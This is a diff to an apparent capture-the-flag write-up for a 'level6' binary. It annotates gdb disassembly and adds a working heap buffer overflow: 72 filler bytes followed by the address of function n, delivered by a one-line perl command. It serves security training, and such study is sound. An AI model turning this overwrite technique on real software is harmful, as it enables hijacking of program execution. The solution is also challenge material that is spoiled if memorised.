@@ -51,7 +51,19 @@ We'll do a buffer overflow !
     0x080484a5 <+41>:	mov    edx,0x8048468                # storing &m into $edx
     0x080484aa <+46>:	mov    eax,DWORD PTR [esp+0x18]     # $eax points at 4 bytes before second mallocated memory
     0x080484ae <+50>:	mov    DWORD PTR [eax],edx
-    0x080484b0 <+52>:	mov    eax,DWORD PTR [ebp+0xc]      # CONTINUE TO WRITE HERE
-    0x080484b3 <+55>:	add    eax,0x4
-    0x080484b6 <+58>:	mov    eax,DWORD PTR [eax]
-    0x080484b8 <+60>:	mov    edx,eax
+    0x080484b0 <+52>:	mov    eax,DWORD PTR [ebp+0xc]
+    0x080484b3 <+55>:	add    eax,0x4                      # $eax now points at the second mallocated memory
+    0x080484b6 <+58>:	mov    eax,DWORD PTR [eax]          # $eax takes value of poited address
+    0x080484b8 <+60>:	mov    edx,eax                      # $edx is set to $eax
+
+The payload :
+
+[B x 72][address of `n`]
+
+    gdb> disas n
+    0x08048454 <+0>:	push   %ebp         # address of n = 0x08048454
+    ...
+
+Script :
+
+./level6 `perl -e 'print "B"x72 . "\x54\x84\x04\x08"'`
